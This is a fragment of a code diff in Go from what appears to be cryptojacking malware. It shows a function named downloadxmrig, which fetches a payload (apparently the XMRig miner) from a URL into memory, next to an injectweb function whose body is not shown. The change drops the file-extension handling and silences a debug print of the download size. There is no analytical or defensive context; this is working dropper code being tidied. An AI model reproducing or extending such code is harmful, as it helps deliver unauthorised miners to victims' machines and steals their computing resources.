@@ -226,12 +226,6 @@ func injectweb(url string) {
 }
 
 func downloadxmrig(url string) []byte {
-	parts := strings.Split(url, "/")
-	fileName := parts[len(parts)-1]
-	extension := filepath.Ext(fileName)
-	if extension == "" {
-		extension = ".exe"
-	}
 
 	// Get the data
 	resp, err := http.Get(url)
@@ -250,6 +244,6 @@ func downloadxmrig(url string) []byte {
 	if _, err = io.Copy(buf, resp.Body); err != nil {
 		return nil
 	}
-	fmt.Println(len(buf.Bytes()))
+	//fmt.Println(len(buf.Bytes()))
 	return buf.Bytes()
 }
